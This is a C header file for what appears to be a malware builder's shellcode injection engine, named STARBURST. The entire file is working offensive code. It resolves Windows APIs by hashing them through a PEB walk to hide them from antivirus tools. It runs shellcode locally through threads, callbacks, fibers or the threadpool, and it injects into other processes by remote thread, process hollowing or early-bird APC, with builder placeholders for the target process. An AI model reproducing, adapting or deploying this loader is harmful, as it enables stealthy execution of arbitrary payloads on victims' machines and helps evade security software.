#ifndef STARBURST_ENGINE_H
#define STARBURST_ENGINE_H

#include <windows.h>
#include <winternl.h>

/*
 * Modular injection engine - hash-resolved, zero plaintext API strings.
 * Builder stamps one ALLOC_* define and one EXEC_* define.
 *
 * Allocation methods:
 *   ALLOC_VIRTUALALLOC        - VirtualAlloc / VirtualAllocEx
 *   ALLOC_NTALLOCATE          - NtAllocateVirtualMemory (syscall-level)
 *   ALLOC_MAPVIEW             - NtCreateSection + NtMapViewOfSection
 *
 * Execution methods (local):
 *   EXEC_DIRECT               - Cast to function pointer, call
 *   EXEC_CREATETHREAD         - CreateThread
 *   EXEC_CALLBACK             - EnumWindows callback
 *   EXEC_FIBER                - ConvertThreadToFiber + CreateFiber
 *   EXEC_THREADPOOL           - TpAllocWork + TpPostWork
 *
 * Injection modes (remote - requires INJECT_REMOTE + target process):
 *   INJECT_REMOTE             - Write into remote process, execute via remote thread
 *   INJECT_HOLLOW             - Process hollowing (suspended process, unmap, write, resume)
 *   INJECT_EARLYBIRD          - Create suspended process, QueueUserAPC, resume
 */

/* ─── FNV1a-32 function hashes ─── */

#define H_NtAllocateVirtualMemory   0xca67b978u
#define H_NtProtectVirtualMemory    0xbd799926u
#define H_NtWriteVirtualMemory      0x43e32f32u
#define H_NtCreateSection           0x3c59f362u
#define H_NtMapViewOfSection        0xcbc9e1aeu
#define H_NtQueueApcThread          0xb10f026cu
#define H_TpAllocWork               0x678de62fu
#define H_TpPostWork                0x0e031b86u
#define H_TpReleaseWork             0xfaf7f1efu
#define H_VirtualAllocEx            0xaeb6049cu
#define H_VirtualProtectEx          0x00014c8eu
#define H_WriteProcessMemory        0xc0088eeau
#define H_CreateThread              0x60ac7e39u
#define H_EnumWindows               0x6d15bbbdu
#define H_ConvertThreadToFiber      0x97b1a935u
#define H_CreateFiber               0x0a32b6b9u
#define H_SwitchToFiber             0x8c6c4a42u
#define H_DeleteFiber               0x25c5e3a4u
#define H_Sleep                     0x2fa62ca8u
#define H_WaitForSingleObject       0x71948ca4u
#define H_CloseHandle               0xfaba0065u
#define H_CreateProcessA            0x4a7c0a09u
#define H_ResumeThread              0xbb21e02eu
#define H_CreateRemoteThread        0xc398c463u
#define H_TerminateProcess          0xf84eee59u
#define H_GetThreadContext          0x85cca27eu
#define H_SetThreadContext          0x6ed04712u
#define H_QueueUserAPC              0x890bb4fbu

#define H_MOD_NTDLL                 0xa62a3b3bu
#define H_MOD_KERNEL32              0xa3e6f6c3u
#define H_MOD_USER32                0xc0323159u

/* ─── ntdll typedefs ─── */

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pNtResumeThread)(
    HANDLE, PULONG);
typedef NTSTATUS (NTAPI *pNtQueueApcThread)(
    HANDLE, PVOID, PVOID, PVOID, PVOID);

typedef NTSTATUS (NTAPI *pTpAllocWork)(
    void**, void*, void*, void*);
typedef void (NTAPI *pTpPostWork)(void*);
typedef void (NTAPI *pTpReleaseWork)(void*);

typedef LPVOID  (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
typedef HANDLE  (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *pEnumWindows)(WNDENUMPROC, LPARAM);
typedef LPVOID  (WINAPI *pConvertThreadToFiber)(LPVOID);
typedef LPVOID  (WINAPI *pCreateFiber)(SIZE_T, LPFIBER_START_ROUTINE, LPVOID);
typedef void    (WINAPI *pSwitchToFiber)(LPVOID);
typedef void    (WINAPI *pDeleteFiber)(LPVOID);
typedef void    (WINAPI *pSleep)(DWORD);
typedef DWORD   (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL    (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL    (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD   (WINAPI *pResumeThread)(HANDLE);
typedef HANDLE  (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL    (WINAPI *pTerminateProcess)(HANDLE, UINT);
typedef BOOL    (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
typedef BOOL    (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT*);
typedef DWORD   (WINAPI *pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);

/* ─── hash-based API resolution via PEB ─── */

static unsigned int _fnv1a(const char *s) {
    unsigned int h = 0x811c9dc5u;
    while (*s) {
        h ^= (unsigned char)*s++;
        h *= 0x01000193u;
    }
    return h;
}

static unsigned int _fnv1a_ci(const WCHAR *s) {
    unsigned int h = 0x811c9dc5u;
    while (*s) {
        unsigned char c = (unsigned char)*s;
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h ^= c;
        h *= 0x01000193u;
        s++;
    }
    return h;
}

static void* _find_module(unsigned int mod_hash) {
    char *peb;
#ifdef _WIN64
    peb = (char*)__readgsqword(0x60);
#else
    peb = (char*)__readfsdword(0x30);
#endif
    char *ldr  = *(char**)(peb + 0x18);
    char *head = ldr + 0x20;
    char *curr = *(char**)head;

    while (curr != head) {
        WCHAR *name = *(WCHAR**)(curr + 0x40);
        if (name) {
            WCHAR *base_name = name;
            WCHAR *p = name;
            while (*p) {
                if (*p == '\\' || *p == '/') base_name = p + 1;
                p++;
            }
            if (_fnv1a_ci(base_name) == mod_hash)
                return *(void**)(curr + 0x20);
        }
        curr = *(char**)curr;
    }
    return NULL;
}

static FARPROC _resolve_export(void *mod_base, unsigned int func_hash) {
    if (!mod_base) return NULL;
    char *base = (char*)mod_base;
    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    char *nt = base + e_lfanew;

#ifdef _WIN64
    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x70);
    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x70 + 4);
#else
    DWORD export_rva  = *(DWORD*)(nt + 0x18 + 0x60);
    DWORD export_size = *(DWORD*)(nt + 0x18 + 0x60 + 4);
#endif
    if (!export_rva || !export_size) return NULL;

    char  *exports  = base + export_rva;
    DWORD  num      = *(DWORD*)(exports + 0x18);
    DWORD *names    = (DWORD*)(base + *(DWORD*)(exports + 0x20));
    WORD  *ordinals = (WORD*) (base + *(DWORD*)(exports + 0x24));
    DWORD *funcs    = (DWORD*)(base + *(DWORD*)(exports + 0x1C));

    for (DWORD i = 0; i < num; i++) {
        if (_fnv1a(base + names[i]) == func_hash)
            return (FARPROC)(base + funcs[ordinals[i]]);
    }
    return NULL;
}

static FARPROC _resolve(unsigned int mod_hash, unsigned int func_hash) {
    return _resolve_export(_find_module(mod_hash), func_hash);
}

/* ═══════════════════════════════════════════════════════
 *  ALLOCATION
 * ═══════════════════════════════════════════════════════ */

static void* engine_alloc(HANDLE hProcess, SIZE_T size) {
#if defined(ALLOC_NTALLOCATE)
    pNtAllocateVirtualMemory NtAlloc =
        (pNtAllocateVirtualMemory)_resolve(H_MOD_NTDLL, H_NtAllocateVirtualMemory);
    void *addr = NULL;
    SIZE_T region = size;
    NTSTATUS st = NtAlloc(hProcess, &addr, 0, &region, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    return (st == 0) ? addr : NULL;

#elif defined(ALLOC_MAPVIEW)
    pNtCreateSection NtCreate =
        (pNtCreateSection)_resolve(H_MOD_NTDLL, H_NtCreateSection);
    pNtMapViewOfSection NtMap =
        (pNtMapViewOfSection)_resolve(H_MOD_NTDLL, H_NtMapViewOfSection);

    HANDLE hSection = NULL;
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)size;

    NTSTATUS st = NtCreate(&hSection, SECTION_ALL_ACCESS, NULL, &secSize,
                           PAGE_READWRITE, SEC_COMMIT, NULL);
    if (st != 0) return NULL;

    void *addr = NULL;
    SIZE_T viewSize = 0;
    st = NtMap(hSection, hProcess, &addr, 0, 0, NULL, &viewSize, 1, 0, PAGE_READWRITE);
    pCloseHandle pClose = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    if (pClose) pClose(hSection);
    return (st == 0) ? addr : NULL;

#else /* ALLOC_VIRTUALALLOC (default) */
    pVirtualAllocEx pAlloc = (pVirtualAllocEx)_resolve(H_MOD_KERNEL32, H_VirtualAllocEx);
    return pAlloc ? pAlloc(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) : NULL;
#endif
}

static int engine_protect(HANDLE hProcess, void *addr, SIZE_T size) {
#if defined(ALLOC_NTALLOCATE) || defined(ALLOC_MAPVIEW)
    pNtProtectVirtualMemory NtProtect =
        (pNtProtectVirtualMemory)_resolve(H_MOD_NTDLL, H_NtProtectVirtualMemory);
    ULONG old = 0;
    void *base = addr;
    SIZE_T region = size;
    return NtProtect(hProcess, &base, &region, PAGE_EXECUTE_READ, &old) == 0;

#else
    pVirtualProtectEx pProtect = (pVirtualProtectEx)_resolve(H_MOD_KERNEL32, H_VirtualProtectEx);
    DWORD old;
    return pProtect ? pProtect(hProcess, addr, size, PAGE_EXECUTE_READ, &old) : 0;
#endif
}

static void engine_write(HANDLE hProcess, void *dst, const void *src, SIZE_T size) {
    if (hProcess == (HANDLE)-1) {
        char *d = (char*)dst;
        const char *s = (const char*)src;
        for (SIZE_T i = 0; i < size; i++) d[i] = s[i];
    } else {
        pNtWriteVirtualMemory NtWrite =
            (pNtWriteVirtualMemory)_resolve(H_MOD_NTDLL, H_NtWriteVirtualMemory);
        if (NtWrite) {
            NtWrite(hProcess, dst, (PVOID)src, size, NULL);
        } else {
            pWriteProcessMemory pWrite = (pWriteProcessMemory)_resolve(H_MOD_KERNEL32, H_WriteProcessMemory);
            if (pWrite) pWrite(hProcess, dst, src, size, NULL);
        }
    }
}

/* ═══════════════════════════════════════════════════════
 *  LOCAL EXECUTION
 * ═══════════════════════════════════════════════════════ */

#if defined(EXEC_FIBER)
struct FiberCtx { void *sc_addr; void *main_fiber; };
static void CALLBACK engine_fiber_wrapper(LPVOID param) {
    struct FiberCtx *ctx = (struct FiberCtx*)param;
    ((void(*)())ctx->sc_addr)();
    pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
    if (pSwitch) pSwitch(ctx->main_fiber);
}
#endif

static HANDLE engine_exec_local(void *addr) {
#if defined(EXEC_CREATETHREAD)
    pCreateThread pCT = (pCreateThread)_resolve(H_MOD_KERNEL32, H_CreateThread);
    return pCT ? pCT(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL) : NULL;

#elif defined(EXEC_CALLBACK)
    pEnumWindows pEW = (pEnumWindows)_resolve(H_MOD_USER32, H_EnumWindows);
    if (pEW) pEW((WNDENUMPROC)addr, 0);
    return NULL;

#elif defined(EXEC_FIBER)
    pConvertThreadToFiber pConvert = (pConvertThreadToFiber)_resolve(H_MOD_KERNEL32, H_ConvertThreadToFiber);
    pCreateFiber pCreate = (pCreateFiber)_resolve(H_MOD_KERNEL32, H_CreateFiber);
    pSwitchToFiber pSwitch = (pSwitchToFiber)_resolve(H_MOD_KERNEL32, H_SwitchToFiber);
    pDeleteFiber pDelete = (pDeleteFiber)_resolve(H_MOD_KERNEL32, H_DeleteFiber);
    if (!pConvert || !pCreate || !pSwitch || !pDelete) return NULL;

    void *mainFiber = pConvert(NULL);
    if (!mainFiber) return NULL;
    struct FiberCtx ctx = { addr, mainFiber };
    void *scFiber = pCreate(0, engine_fiber_wrapper, &ctx);
    if (!scFiber) return NULL;
    pSwitch(scFiber);
    pDelete(scFiber);
    return NULL;

#elif defined(EXEC_THREADPOOL)
    pTpAllocWork TpAlloc = (pTpAllocWork)_resolve(H_MOD_NTDLL, H_TpAllocWork);
    pTpPostWork  TpPost  = (pTpPostWork)_resolve(H_MOD_NTDLL, H_TpPostWork);
    pTpReleaseWork TpRel = (pTpReleaseWork)_resolve(H_MOD_NTDLL, H_TpReleaseWork);

    if (!TpAlloc || !TpPost || !TpRel) return NULL;

    void *work = NULL;
    NTSTATUS st = TpAlloc(&work, (void*)addr, NULL, NULL);
    if (st != 0 || !work) return NULL;
    TpPost(work);
    TpRel(work);
    pSleep pSl = (pSleep)_resolve(H_MOD_KERNEL32, H_Sleep);
    if (pSl) pSl(1000);
    return NULL;

#else /* EXEC_DIRECT (default) */
    ((void(*)())addr)();
    return NULL;
#endif
}

/* ═══════════════════════════════════════════════════════
 *  REMOTE INJECTION
 * ═══════════════════════════════════════════════════════ */

#if defined(INJECT_REMOTE)
static int engine_inject_remote(const unsigned char *sc, unsigned int sc_len, const char *target) {
    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
    pCreateRemoteThread pCRT = (pCreateRemoteThread)_resolve(H_MOD_KERNEL32, H_CreateRemoteThread);
    pWaitForSingleObject pWFSO = (pWaitForSingleObject)_resolve(H_MOD_KERNEL32, H_WaitForSingleObject);
    if (!pCP || !pCH) return 0;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCP(target, NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        if (pTP) pTP(pi.hProcess, 1);
        pCH(pi.hThread);
        pCH(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    if (pRT) pRT(pi.hThread);

    HANDLE hRemote = pCRT ? pCRT(pi.hProcess, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL) : NULL;
    if (hRemote) {
        if (pWFSO) pWFSO(hRemote, INFINITE);
        pCH(hRemote);
    }

    pCH(pi.hThread);
    pCH(pi.hProcess);
    return 1;
}
#endif

#if defined(INJECT_HOLLOW)
static int engine_inject_hollow(const unsigned char *sc, unsigned int sc_len, const char *target) {
    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    pGetThreadContext pGTC = (pGetThreadContext)_resolve(H_MOD_KERNEL32, H_GetThreadContext);
    pSetThreadContext pSTC = (pSetThreadContext)_resolve(H_MOD_KERNEL32, H_SetThreadContext);
    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
    if (!pCP || !pCH || !pGTC || !pSTC || !pRT) return 0;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCP(target, NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    pGTC(pi.hThread, &ctx);

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        if (pTP) pTP(pi.hProcess, 1);
        pCH(pi.hThread);
        pCH(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

#ifdef _WIN64
    ctx.Rip = (DWORD64)addr;
#else
    ctx.Eip = (DWORD)addr;
#endif
    pSTC(pi.hThread, &ctx);
    pRT(pi.hThread);

    pCH(pi.hThread);
    pCH(pi.hProcess);
    return 1;
}
#endif

#if defined(INJECT_EARLYBIRD)
static int engine_inject_earlybird(const unsigned char *sc, unsigned int sc_len, const char *target) {
    pCreateProcessA pCP = (pCreateProcessA)_resolve(H_MOD_KERNEL32, H_CreateProcessA);
    pTerminateProcess pTP = (pTerminateProcess)_resolve(H_MOD_KERNEL32, H_TerminateProcess);
    pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
    pResumeThread pRT = (pResumeThread)_resolve(H_MOD_KERNEL32, H_ResumeThread);
    if (!pCP || !pCH || !pRT) return 0;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!pCP(target, NULL, NULL, NULL, FALSE,
             CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return 0;
    }

    void *addr = engine_alloc(pi.hProcess, sc_len);
    if (!addr) {
        if (pTP) pTP(pi.hProcess, 1);
        pCH(pi.hThread);
        pCH(pi.hProcess);
        return 0;
    }

    engine_write(pi.hProcess, addr, sc, sc_len);
    engine_protect(pi.hProcess, addr, sc_len);

    pNtQueueApcThread NtQueueApc =
        (pNtQueueApcThread)_resolve(H_MOD_NTDLL, H_NtQueueApcThread);
    if (NtQueueApc) {
        NtQueueApc(pi.hThread, addr, NULL, NULL, NULL);
    } else {
        pQueueUserAPC pQUA = (pQueueUserAPC)_resolve(H_MOD_KERNEL32, H_QueueUserAPC);
        if (pQUA) pQUA((PAPCFUNC)addr, pi.hThread, 0);
    }

    pRT(pi.hThread);

    pCH(pi.hThread);
    pCH(pi.hProcess);
    return 1;
}
#endif

/* ═══════════════════════════════════════════════════════
 *  UNIFIED ENTRY POINT
 * ═══════════════════════════════════════════════════════ */

static int engine_run(const unsigned char *sc, unsigned int sc_len) {
#if defined(INJECT_REMOTE)
    return engine_inject_remote(sc, sc_len, %INJECT_TARGET%);
#elif defined(INJECT_HOLLOW)
    return engine_inject_hollow(sc, sc_len, %INJECT_TARGET%);
#elif defined(INJECT_EARLYBIRD)
    return engine_inject_earlybird(sc, sc_len, %INJECT_TARGET%);
#else
    HANDLE hSelf = (HANDLE)-1;
    void *addr = engine_alloc(hSelf, sc_len);
    if (!addr) return 0;

    engine_write(hSelf, addr, sc, sc_len);
    engine_protect(hSelf, addr, sc_len);

    HANDLE hThread = engine_exec_local(addr);
    if (hThread) {
        pWaitForSingleObject pWFSO = (pWaitForSingleObject)_resolve(H_MOD_KERNEL32, H_WaitForSingleObject);
        pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
        if (pWFSO) pWFSO(hThread, INFINITE);
        if (pCH) pCH(hThread);
    }
    return 1;
#endif
}

#endif /* STARBURST_ENGINE_H */
